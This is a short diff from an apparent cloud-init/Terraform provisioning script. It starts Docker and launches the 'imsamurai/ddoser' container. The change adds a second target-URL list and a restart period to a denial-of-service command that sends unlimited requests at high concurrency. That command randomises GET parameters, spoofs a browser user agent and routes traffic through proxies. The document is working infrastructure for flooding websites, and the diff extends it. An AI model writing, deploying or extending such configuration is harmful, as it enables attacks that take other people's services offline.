@@ -63,6 +63,6 @@ runcmd:
   - systemctl unmask docker.socket
   - systemctl start docker.service
   - systemctl start docker
-  - docker run -d --ulimit nofile=100000:100000 imsamurai/ddoser --target-urls-file "${var.targets_file_url}" --concurrency 300 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url "${var.proxy_file_url}"
+  - docker run -d --ulimit nofile=100000:100000 imsamurai/ddoser --target-urls-file "${var.targets_file_url}" --target-urls-file "${var.special_targets_file_url}" --concurrency 300 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --proxy-url "${var.proxy_file_url}" --restart-period 600
 EOF
 }
